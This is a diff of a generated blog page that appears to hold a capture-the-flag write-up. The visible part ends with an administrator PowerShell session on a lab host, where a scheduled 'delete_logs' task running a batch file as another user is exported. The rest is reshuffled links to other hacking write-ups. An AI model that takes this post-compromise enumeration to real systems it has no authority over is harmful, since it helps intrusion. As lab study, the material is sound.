+</span></span><span class="line"><span class="cl"><span class="n">TaskName</span>           <span class="err">:</span> <span class="n">delete_logs</span>
+</span></span><span class="line"><span class="cl"><span class="n">TaskPath</span>           <span class="err">:</span> <span class="p">\</span>
+</span></span><span class="line"><span class="cl"><span class="n">PSComputerName</span>     <span class="err">:</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="n">P</span><span class="p">$]</span> <span class="n">minion</span><span class="p">\</span><span class="n">administrator</span><span class="nv">@MINION</span> <span class="n">Desktop</span><span class="p">&gt;</span> <span class="nb">Export-ScheduledTask</span> <span class="n">-Taskname</span> <span class="n">delete_logs</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="k">?</span><span class="n">xml</span> <span class="n">version</span><span class="p">=</span><span class="s2">&#34;1.0&#34;</span> <span class="n">encoding</span><span class="p">=</span><span class="s2">&#34;UTF-16&#34;</span><span class="p">?&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="n">Task</span> <span class="n">version</span><span class="p">=</span><span class="s2">&#34;1.2&#34;</span> <span class="n">xmlns</span><span class="p">=</span><span class="s2">&#34;http://schemas.microsoft.com/windows/2004/02/mit/task&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="n">RegistrationInfo</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="n">Date</span><span class="p">&gt;</span><span class="n">2017</span><span class="p">-</span><span class="n">08</span><span class="p">-</span><span class="n">10T16</span><span class="err">:</span><span class="n">36</span><span class="err">:</span><span class="n">36</span><span class="p">.</span><span class="n">2851262</span><span class="p">&lt;/</span><span class="n">Date</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="n">Author</span><span class="p">&gt;</span><span class="n">WIN</span><span class="p">-</span><span class="n">2RTO3C7989S</span><span class="p">\</span><span class="n">Administrator</span><span class="p">&lt;/</span><span class="n">Author</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="n">RegistrationInfo</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="n">Triggers</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="n">CalendarTrigger</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="n">Repetition</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="n">Interval</span><span class="p">&gt;</span><span class="n">PT5M</span><span class="p">&lt;/</span><span class="n">Interval</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="n">Duration</span><span class="p">&gt;</span><span class="n">P1D</span><span class="p">&lt;/</span><span class="n">Duration</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="n">StopAtDurationEnd</span><span class="p">&gt;</span><span class="n">false</span><span class="p">&lt;/</span><span class="n">StopAtDurationEnd</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">&lt;/</span><span class="n">Repetition</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="n">StartBoundary</span><span class="p">&gt;</span><span class="n">2017</span><span class="p">-</span><span class="n">08</span><span class="p">-</span><span class="n">10T16</span><span class="err">:</span><span class="n">36</span><span class="err">:</span><span class="n">16</span><span class="p">.</span><span class="n">9925913</span><span class="p">&lt;/</span><span class="n">StartBoundary</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="n">Enabled</span><span class="p">&gt;</span><span class="n">true</span><span class="p">&lt;/</span><span class="n">Enabled</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="n">ScheduleByDay</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="n">DaysInterval</span><span class="p">&gt;</span><span class="n">1</span><span class="p">&lt;/</span><span class="n">DaysInterval</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">&lt;/</span><span class="n">ScheduleByDay</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="n">CalendarTrigger</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="n">Triggers</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="n">Principals</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="n">Principal</span> <span class="n">id</span><span class="p">=</span><span class="s2">&#34;Author&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="n">RunLevel</span><span class="p">&gt;</span><span class="n">HighestAvailable</span><span class="p">&lt;/</span><span class="n">RunLevel</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="n">UserId</span><span class="p">&gt;</span><span class="n">decoder</span><span class="p">&lt;/</span><span class="n">UserId</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="n">LogonType</span><span class="p">&gt;</span><span class="n">Password</span><span class="p">&lt;/</span><span class="n">LogonType</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="n">Principal</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="n">Principals</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="n">Settings</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="n">MultipleInstancesPolicy</span><span class="p">&gt;</span><span class="n">Parallel</span><span class="p">&lt;/</span><span class="n">MultipleInstancesPolicy</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="n">DisallowStartIfOnBatteries</span><span class="p">&gt;</span><span class="n">false</span><span class="p">&lt;/</span><span class="n">DisallowStartIfOnBatteries</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="n">StopIfGoingOnBatteries</span><span class="p">&gt;</span><span class="n">false</span><span class="p">&lt;/</span><span class="n">StopIfGoingOnBatteries</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="n">AllowHardTerminate</span><span class="p">&gt;</span><span class="n">true</span><span class="p">&lt;/</span><span class="n">AllowHardTerminate</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="n">StartWhenAvailable</span><span class="p">&gt;</span><span class="n">false</span><span class="p">&lt;/</span><span class="n">StartWhenAvailable</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="n">RunOnlyIfNetworkAvailable</span><span class="p">&gt;</span><span class="n">false</span><span class="p">&lt;/</span><span class="n">RunOnlyIfNetworkAvailable</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="n">IdleSettings</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="n">StopOnIdleEnd</span><span class="p">&gt;</span><span class="n">true</span><span class="p">&lt;/</span><span class="n">StopOnIdleEnd</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="n">RestartOnIdle</span><span class="p">&gt;</span><span class="n">false</span><span class="p">&lt;/</span><span class="n">RestartOnIdle</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="n">IdleSettings</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="n">AllowStartOnDemand</span><span class="p">&gt;</span><span class="n">true</span><span class="p">&lt;/</span><span class="n">AllowStartOnDemand</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="n">Enabled</span><span class="p">&gt;</span><span class="n">true</span><span class="p">&lt;/</span><span class="n">Enabled</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="n">Hidden</span><span class="p">&gt;</span><span class="n">false</span><span class="p">&lt;/</span><span class="n">Hidden</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="n">RunOnlyIfIdle</span><span class="p">&gt;</span><span class="n">false</span><span class="p">&lt;/</span><span class="n">RunOnlyIfIdle</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="n">WakeToRun</span><span class="p">&gt;</span><span class="n">false</span><span class="p">&lt;/</span><span class="n">WakeToRun</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="n">ExecutionTimeLimit</span><span class="p">&gt;</span><span class="n">PT1H</span><span class="p">&lt;/</span><span class="n">ExecutionTimeLimit</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="n">Priority</span><span class="p">&gt;</span><span class="n">7</span><span class="p">&lt;/</span><span class="n">Priority</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="n">Settings</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="n">Actions</span> <span class="n">Context</span><span class="p">=</span><span class="s2">&#34;Author&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="n">Exec</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="n">Command</span><span class="p">&gt;</span><span class="n">C:</span><span class="p">\</span><span class="n">sysadmscripts</span><span class="p">\</span><span class="n">del_logs</span><span class="p">.</span><span class="n">bat</span><span class="p">&lt;/</span><span class="n">Command</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="n">Exec</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="n">Actions</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="n">Task</span><span class="p">&gt;</span></span></span></code></pre></div></div></p>
 
 <p>Thal&rsquo;s all folks :)</p>
 
@@ -739,53 +739,21 @@ The problem is that if we try to send this payload via the xcmd paremeter some s
            
            
            
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/sense_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/pfsense.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Sense write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Sense</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">24 Mar 2018</time>
+      <time lang="el">24 Μαρ 2018</time>
+    </footer>
+  </a>
+</article>
+
            
           
            
@@ -872,16 +840,16 @@ The problem is that if we try to send this payload via the xcmd paremeter some s
            
            
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/unattended_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/rold/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/unattended.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/rold.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Unattended write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Unattended</h3>
+      <h3 class="title" lang="en">Retriever of Lost Dreams</h3>
+      <h3 class="title" lang="el">Ο Ιχνηλάτης των Χαμένων Ονείρων</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">23 Aug 2019</time>
-      <time lang="el">23 Αυγ 2019</time>
+      <time lang="en">16 Aug 2015</time>
+      <time lang="el">16 Αυγ 2015</time>
     </footer>
   </a>
 </article>
@@ -894,6 +862,30 @@ The problem is that if we try to send this payload via the xcmd paremeter some s
           
            
            
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/fulcrum_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/fulcrum.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Fulcrum write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Fulcrum</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">09 Jun 2018</time>
+      <time lang="el">09 Ιουν 2018</time>
+    </footer>
+  </a>
+</article>
+
            
           
            
@@ -920,20 +912,32 @@ The problem is that if we try to send this payload via the xcmd paremeter some s
            
            
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/fortune_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/querier_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/fortune.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/querier.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Fortune write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Fortune</h3>
+      <h3 class="title" lang="en">Querier write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Querier</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">02 Aug 2019</time>
-      <time lang="el">02 Αυγ 2019</time>
+      <time lang="en">22 Jun 2019</time>
+      <time lang="el">22 Ιουν 2019</time>
     </footer>
   </a>
 </article>
 
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
            
           
            
@@ -967,17 +971,21 @@ The problem is that if we try to send this payload via the xcmd paremeter some s
            
            
            
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/matchsticks/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/matchsticks.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Alamot&#39;s matchstick puzzles</h3>
+      <h3 class="title" lang="el">Σπιρτοσπαζοκεφαλιές</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">11 Mar 2014</time>
+      <time lang="el">11 Μαρ 2014</time>
+    </footer>
+  </a>
+</article>
+
            
           
            
@@ -1015,269 +1023,9 @@ The problem is that if we try to send this payload via the xcmd paremeter some s
            
            
            
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/legacy_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/legacy.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Legacy write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Legacy</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">19 Oct 2017</time>
-      <time lang="el">19 Οκτ 2017</time>
-    </footer>
-  </a>
-</article>
-
-           
           
            
            
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/nineveh_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/nineveh.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Nineveh write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Nineveh</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">17 Dec 2017</time>
-      <time lang="el">17 Δεκ 2017</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/node_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/jscode.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Node write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Node</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">03 Mar 2018</time>
-      <time lang="el">03 Μαρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/lacasadepapel_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/ace.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">LaCasaDePapel write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του LaCasaDePapel</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">27 Jul 2019</time>
-      <time lang="el">27 Ιουλ 2019</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/inception_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/mirror.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Inception write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Inception</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">14 Apr 2018</time>
-      <time lang="el">14 Απρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/fulcrum_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/fulcrum.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Fulcrum write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Fulcrum</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">09 Jun 2018</time>
-      <time lang="el">09 Ιουν 2018</time>
-    </footer>
-  </a>
-</article>
-
            
           
            
@@ -1407,6 +1155,34 @@ The problem is that if we try to send this payload via the xcmd paremeter some s
            
            
            
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/fortune_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/fortune.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Fortune write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Fortune</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">02 Aug 2019</time>
+      <time lang="el">02 Αυγ 2019</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
           
            
            
@@ -1440,24 +1216,20 @@ The problem is that if we try to send this payload via the xcmd paremeter some s
            
            
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/rold/" class="clearfix">
+  <a href="https://alamot.github.io/inception_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/rold.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/mirror.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Retriever of Lost Dreams</h3>
-      <h3 class="title" lang="el">Ο Ιχνηλάτης των Χαμένων Ονείρων</h3>
+      <h3 class="title" lang="en">Inception write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Inception</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">16 Aug 2015</time>
-      <time lang="el">16 Αυγ 2015</time>
+      <time lang="en">14 Apr 2018</time>
+      <time lang="el">14 Απρ 2018</time>
     </footer>
   </a>
 </article>
 
-           
-          
-           
-           
            
           
            
@@ -1495,21 +1267,9 @@ The problem is that if we try to send this payload via the xcmd paremeter some s
            
            
            
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/sense_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/pfsense.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Sense write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Sense</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">24 Mar 2018</time>
-      <time lang="el">24 Μαρ 2018</time>
-    </footer>
-  </a>
-</article>
-
+          
+           
+           
            
           
            
@@ -1527,22 +1287,6 @@ The problem is that if we try to send this payload via the xcmd paremeter some s
            
            
            
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/querier_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/querier.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Querier write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Querier</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">22 Jun 2019</time>
-      <time lang="el">22 Ιουν 2019</time>
-    </footer>
-  </a>
-</article>
-
-           
           
            
            
@@ -1550,26 +1294,6 @@ The problem is that if we try to send this payload via the xcmd paremeter some s
           
            
            
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/reddish_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/reddish.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Reddish write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Reddish</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">26 Jan 2019</time>
-      <time lang="el">26 Ιαν 2019</time>
-    </footer>
-  </a>
-</article>
-
            
           
            
@@ -1603,21 +1327,37 @@ The problem is that if we try to send this payload via the xcmd paremeter some s
            
            
            
+          
+           
+           
+           
+          
+           
+           
+           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/matchsticks/" class="clearfix">
+  <a href="https://alamot.github.io/reddish_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/matchsticks.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/reddish.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Alamot&#39;s matchstick puzzles</h3>
-      <h3 class="title" lang="el">Σπιρτοσπαζοκεφαλιές</h3>
+      <h3 class="title" lang="en">Reddish write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Reddish</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">11 Mar 2014</time>
-      <time lang="el">11 Μαρ 2014</time>
+      <time lang="en">26 Jan 2019</time>
+      <time lang="el">26 Ιαν 2019</time>
     </footer>
   </a>
 </article>
 
+           
+          
+           
+           
+           
+          
+           
+           
            
           
            
@@ -1704,13 +1444,6 @@ The problem is that if we try to send this payload via the xcmd paremeter some s
            
            
           
-          
-           
-           
-           
-           
-          
-           
            
            
            
@@ -1718,14 +1451,7 @@ The problem is that if we try to send this payload via the xcmd paremeter some s
            
            
            
-           
           
-           
-           
-           
-           
-          
-           
            
            
            
@@ -1733,14 +1459,7 @@ The problem is that if we try to send this payload via the xcmd paremeter some s
            
            
            
-           
           
-           
-           
-           
-           
-          
-           
            
            
            
@@ -1748,34 +1467,27 @@ The problem is that if we try to send this payload via the xcmd paremeter some s
            
            
            
-           
           
            
            
            
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/nineveh_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/nineveh.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Nineveh write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Nineveh</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">17 Dec 2017</time>
+      <time lang="el">17 Δεκ 2017</time>
+    </footer>
+  </a>
+</article>
+
            
           
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
            
            
            
@@ -1783,14 +1495,7 @@ The problem is that if we try to send this payload via the xcmd paremeter some s
            
            
            
-           
           
-           
-           
-           
-           
-          
-           
            
            
            
@@ -1798,34 +1503,27 @@ The problem is that if we try to send this payload via the xcmd paremeter some s
            
            
            
-           
           
            
            
            
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/node_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/jscode.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Node write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Node</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">03 Mar 2018</time>
+      <time lang="el">03 Μαρ 2018</time>
+    </footer>
+  </a>
+</article>
+
            
           
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
            
            
            
@@ -1833,14 +1531,7 @@ The problem is that if we try to send this payload via the xcmd paremeter some s
            
            
            
-           
           
-           
-           
-           
-           
-          
-           
            
            
            
@@ -1848,14 +1539,7 @@ The problem is that if we try to send this payload via the xcmd paremeter some s
            
            
            
-           
           
-           
-           
-           
-           
-          
-           
            
            
            
@@ -1863,12 +1547,171 @@ The problem is that if we try to send this payload via the xcmd paremeter some s
            
            
            
+          
+           
+           
            
           
            
            
            
+          
            
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/unattended_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/unattended.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Unattended write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Unattended</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">23 Aug 2019</time>
+      <time lang="el">23 Αυγ 2019</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/lacasadepapel_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/ace.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">LaCasaDePapel write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του LaCasaDePapel</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">27 Jul 2019</time>
+      <time lang="el">27 Ιουλ 2019</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/legacy_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/legacy.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Legacy write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Legacy</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">19 Oct 2017</time>
+      <time lang="el">19 Οκτ 2017</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
           
            
            
@@ -1920,16 +1763,16 @@ The problem is that if we try to send this payload via the xcmd paremeter some s
            
            
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/winrm_shell/" class="clearfix">
+  <a href="https://alamot.github.io/path_traversal_archiver/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/winrm.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/path.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">WinRM shell (a.k.a. PowerShell Remoting) with file upload capability</h3>
-      <h3 class="title" lang="el">WinRM κέλυφος (PowerShell Remoting) με δυνατότητα ανεβάσματος αρχείων</h3>
+      <h3 class="title" lang="en">Path-traversal archiver</h3>
+      <h3 class="title" lang="el">Αρχειοθέτης με διάσχιση διαδρομής</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">09 Apr 2018</time>
